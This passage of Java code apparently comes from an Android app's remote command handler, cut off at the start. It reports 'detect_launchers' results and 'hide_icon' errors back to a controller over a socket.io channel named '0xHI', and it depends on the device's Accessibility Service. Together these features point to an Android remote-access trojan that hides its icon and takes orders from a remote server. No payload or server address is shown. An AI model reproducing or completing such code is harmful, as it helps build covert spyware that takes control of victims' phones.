                    response.put("action", "detect_launchers");
                    response.put("success", true);
                    response.put("launchers", launchers);
                    response.put("detectedCount", launchers.length());
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xHI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xHI", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "hide_icon_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xHI", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }


}
